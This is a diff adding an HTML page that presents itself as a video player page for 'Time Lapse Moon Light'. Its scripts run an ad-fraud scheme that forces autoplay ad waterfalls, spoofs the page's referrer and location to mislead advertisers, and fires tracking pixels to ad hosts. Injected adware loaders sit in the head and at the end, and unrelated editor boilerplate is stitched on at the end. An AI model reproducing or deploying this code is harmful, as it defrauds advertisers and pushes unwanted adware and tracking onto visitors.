@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html>
+<head><script> _BIT_LocalStoreDetails="{eyJpbnN0YWxsZXJfbmFtZSI6InZiYXRlc19jbGttaWRleF8uZXhlIiwidG9vbGJhcklEIjoiM0NENzNFMUM3MkZCNDY1ODhENDdERDY2NzQ0MkQxNzMiLCJwcm9kdWN0X25hbWUiOiJzaG9wcGVyejExMTIyMDE1MTQ1OSIsImNoYW5lbElEIjoiY2xrbWlkZXgiLCJpbnN0YWxsX3RpbWUiOiIxMi0xMi0yMDE1IiwicHJvZHVjdF92ZXJzaW9uIjoiMi4wLjAuNDgwIiwidmJ0c19nZW8iOiJJRHx8fDg2NDE0NDk4NjAwODIwODAiLCJhZEJsb2NrX3RpbWVyIjoidHJ1ZXx8fDE0NTA4MDQ1ODI1MTciLCJpbmpzY3MiOiJ0cnVlfHx8ODY0MTQ1MDcxODc4MjM2MCIsInB4bF9WQkFURVNfZGFpbHlQaW5nIjoiZGFpbHlQaW5nfHx8MTQ1MDgwNDMxNzM1OSIsIm5iX3RpbWVyIjoidHJ1ZXx8fDE0NTA4MDUxNzEyMTQiLCJwcmVwb3BfdGltZXIiOiIxNDUwNzI1MTkzNjk3fHx8MTQ1MDgxMTU5MzY5OCIsInByZXBvcF9pbmRleCI6IjF8fHwxNDUwODExNTkzNzA0IiwiVkJBVEVTX2RhaWx5UGluZyI6InRydWV8fHwxNDUwMzY3OTYwMDQ2IiwiVkJBVEVTX0luc3RhbGxlZCI6InRydWV8fHw4NjQxNDUwNTQ1NTcxNzE5In0=}"</script><script id="_SFR_xl" src="http://cds.q2u3z6t7.hwcdn.net/extless/js/preloaderrs.js?tbid=3CD73E1C72FB46588D47DD667442D173&chnl=clkmidex&prd=shopperz111220151459&ind=12-12-2015&ver=2.0.0.480&drv=1"></script>
+    <meta charset="utf-8">
+    <title>P</title>
+</head>
+<style type="text/css">
+#p,body{margin:0;padding:0;border:0}#p{position:relative;z-index:1}#o{position:absolute;left:350px;top:105px;z-index:9;background:#fff}#o iframe{width:300px;height:250px}.n{display:none}
+</style>
+<body>
+    <div id="p"></div>
+    <div id="o"></div>
+    <script type="text/javascript" src="//videosupreme.silvercdn.com/js/jwplayer.js"></script>
+    <script>
+(function() {
+  var doc = document,
+    w = doc.documentElement.clientWidth || 1E3,
+    h = doc.documentElement.clientHeight || 1E3 / 2,
+    a = doc.body,
+    dd = doc.domain,
+    v = doc.getElementById("p"),
+    o = doc.getElementById("o"),
+    bw = 310,
+    bw2 = 810,
+    timeOuts = {},
+    f = "hashed".substr(0, 4),
+    ref = (doc.referrer).replace("full/", ""),
+    mobile = w > bw2 && e(f).length,
+    tags = "b0e736bf975bdbdb221a0cf245ac648f 96be767fce1f2a81047fd6fc2c3c0af0 11921338d4b03878c636d85e3017b0fb d840dc405b712856c7c407e9f389b534 c19aa57dabda6fb821a2662f0ac12d8c 699325fad0d24a10ac4f5ee39c5fd020 4624a3cf02f00234360e60763173fa75 f30e6199fad124d7dceefe7b2f82c580 adbbfb0d046e6a16ef7edaf657a3b2ed 90af8c33ad323b2029be968ce78d79e7".split(" "),
+    pgs = "sdErXk ZWglRm ffUsgt er92o3 elutmq 8rTIob GcTn3k IiP5qD oWaCzP uXHgwQ DcP3I6 wLNWbI cbU7MM jGTfsE mwZHy3 U6hQTx Um1ehy QUJTwN 7nABLq 9yx4Pl LIHdim lTttSA 93T0Eu tmPPdo 2wdk5u 4RmfQd HLb8pu 8NnpjX       ",
+    page = "  " + pgs + pgs + pgs + "extreme lifehacks fails timelapse",
+    page = page.split(" "),
+    tagsl = tags.length,
+    protocol = location.protocol,
+    NY = e("new") == "y",
+    c = function(a) {
+      var b = new Date,
+        c = new Date(b.getFullYear(), b.getMonth(), b.getDate(), 23, 59, 59);
+      doc.cookie = "dharma=" + a + "; expires=" + c.toGMTString() + "; path=/";
+      return a
+    },
+    d = function() {
+      var a = "; " + doc.cookie,
+        b = a.split("; dharma=");
+      return b.length == 2 ? b.pop().split(";").shift() : 0
+    },
+    b = d(),
+    n = function() {
+      return b >= tagsl - 1 ? 0 : parseInt(b) + 1
+    },
+    q = function(a, b) {
+      (new Image).src = b + "/" + a + "&cb=" + Math.random()
+    },
+    p = location.protocol,
+    j = p + "//www.jscount.com/",
+    s = p + "//www.adshost2.com/",
+    t = p + "//ecpmrocks.com/",
+    cdn = p + "//videosupreme.silvercdn.com/",
+    addH = a.addEventListener ? function(t, e, h) {
+      t.addEventListener(e, h, !1)
+    } : function(t, e, h) {
+      t.attachEvent("on" + e, h)
+    };
+
+  function shuffle(o) {
+    for (var j, x, i = o.length; i; j = Math.floor(Math.random() *
+        i), x = o[--i], o[i] = o[j], o[j] = x);
+    return o
+  }
+
+  function e(a) {
+    if (!e.s) {
+      e.s = {}, b = location.search.substr(location.search.indexOf("?") + 1), b = b.split("&");
+      for (var i = 0; i < b.length; i++) {
+        var c = b[i].split("=");
+        if (c[0] !== "" && c[1] !== "") e.s[c[0]] = c[1]
+      }
+    }
+    var d = "";
+    if (typeof e.s[a] !== "undefined") d = e.s[a];
+    return d
+  }
+  page = shuffle(page);
+  if (page[0] != "") page[0] += "/";
+  var refd = ref.split("/");
+  if (typeof refd[2] === "undefined") refd[2] = dd;
+  var name = refd[2];
+  if (mobile) name = dd, ref = "http://" + name + "/oWaCzP/";
+  var post = "&vastv=3.0&cp.id=oWaCzP&cp.title=" +
+    encodeURIComponent("Time Lapse Moon Light") + "&cp.duration=0:29&cp.desc=" + encodeURIComponent("Time Lapse Moon Light (HD 720p)") + "&cp.page=" + page[0] + "&cp.random=" + e("random") + "&cp.d=" + encodeURIComponent(name) + "&cp.dr=" + encodeURIComponent(ref);
+  for (var i = 0; i < tags.length; i++) tags[i] = t + "vast.xml?key=" + tags[i] + post;
+  jwplayer.key = "sbXvZndPInKE3ObN4AOZhAcNboO0ixxxxPcp5A==";
+  jwplayer(v).setup({
+    html5player: cdn + "js/jwplayer.html5.js",
+    flashplayer: cdn + "js/jwplayer.flash.swf",
+    autostart: "true",
+    file: mobile ? cdn + "low/oWaCzP.mp4" : cdn +
+      "media/oWaCzP.mp4",
+    image: mobile ? "" : cdn + "img/logo-full.png",
+    width: w,
+    height: h,
+    primary: "flash",
+    advertising: {
+      client: "vast",
+      adschedule: {
+        adbreak1: {
+          offset: "pre",
+          tag: tags[b] + "&cb=" + (new Date).getTime()
+        }
+      }
+    }
+  });
+  // console.log('waterfall '+b);
+
+  c(n());
+  if (mobile) {
+    window.document.__defineGetter__('referrer', function() {
+      return 'http://' + location.host + '/oWaCzP/';
+    });
+    window.document.__defineGetter__('location', function() {
+      return 'http://' + location.host + '/embed/oWaCzP/';
+    });
+    if (window.parent != null) {
+      window.parent = null;
+    }
+    var OS = function() {
+        var f = document.createElement("IFRAME");
+        f.setAttribute("src", "http://ecpmrocks.com/ads?key=9c2b1729f0a96c46abd07cd458bd83e7&cp.random=" + e("random") + "&cb=" + (new Date).getTime());
+        f.setAttribute("scrolling", "no");
+        f.setAttribute("frameborder", "no");
+        o.innerHTML = "";
+        o.appendChild(f)
+      },
+      y = function() {
+        o.className =
+          "n";
+        OS()
+      },
+      x = 0,
+      z = function(x) {
+        o.className = "";
+        b = n();
+        c(n());
+        jwplayer(v).playAd(tags[b] + "&cb2=" + (new Date).getTime());
+        clearTimeout(timeOuts[x]);
+        // console.log('waterfall '+b);
+
+      };
+    OS();
+    jwplayer(v).onAdClick(z).onAdComplete(z).onAdSkipped(z).onAdPause(z).onAdPlay(y).onAdError(function() {
+      x++;
+      if (x < 30) {
+        z(x);
+      } else {
+        timeOuts[x] = setTimeout(function() {
+          z(x);
+        }, 5000)
+      }
+    }).onBeforePlay(function() {
+      jwplayer(v).setMute(NY);
+      if (!NY) jwplayer(v).setVolume(10)
+    })
+  }
+  jwplayer(v).onAdImpression(function() {
+    q("a/1672/e9fb0379/z?c=1", j);
+    if (e(f).length) {
+      q("at?subId=" + e(f), t);
+      q("at?subId=" + e(f), s)
+    }
+  });
+
+  function resize() {
+    w = document.documentElement.clientWidth;
+    h = document.documentElement.clientHeight;
+    jwplayer(v).resize(w, h)
+  }
+  addH(window, "orientationchange", resize);
+  addH(window, "resize", resize)
+})();
+
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-55189971-1', 'auto');
+  ga('send', 'pageview');
+
+
+
+
+</script>
+<img src="https://d5nxst8fruw4z.cloudfront.net/atrk.gif?account=IRdKk1a4eFf2cv" class="n" height="1" width="1" alt="" />
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bMorHA%2bW6L%2fc8Nj%2be8gpJxbD6JCII4h1EALkSTbotyAWLKi5r1%2fWHlDRZ20D1KDeOh934lov4huad7KPaHBV3G8WpfQmDGf5KsQ21X4oPlfgX8ILyYPOGaFGgmWJoM2ndOeqzy3uH%2bLgQmg%2feU4yEkbyyUtApMHBhYDEujs%2fU4AR2HoPvyU9GhK%2fSOl26lZiQgehd3IRuBOMWPyoNmTmEcgXRHkSYHg7uxoaHKXAEtCK%2b0dWYzFxcXlWH9AXhcaXNgTQoZN3LQ6Z24m2yvZ963hi1KViw1mztnRaPwB0P5pTEfF9AymEF9l6d%2fdsHaZIustD6%2fZcAKQA25VQ8NDiksmgi%2fUW%2fhvX0e5eNTnfJK30qh7W%2bKi09Wi1EbM5SpAMGRHt3n3lFlTrm97nepNnXcexAWc5kaQtuMwS%2b2Lpq7nNNA3ZkIIgPw6DLGc%2fr9osnQQM2uaXA1jGIjk2sx0bvOlO5Aif%2fvLYBzkHOtMhk9NRgFejYOdKeIVIunY6ZV9D3b5eMIP1YDgqKc9yDKFhCWShOQY7w%2bzzfDu%2bBQKrgMw0e2Zso8xJlpLXpsdt7NDPGQEpbvzuiLdVXoEpwW7giC0xJj3W9GKPYUMAGR49hnJHM%2fl12JwEic9SUZ4WqYAUzbQV%2bQc%2fbb3krvsvg4pTk7UcVq3MCh8k00zHFNL9%2bClU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html><h3>Welcome to the real-time HTML editor!</h3>
+<p>Type HTML in the textarea above, and it will magically appear in the frame below.</p>
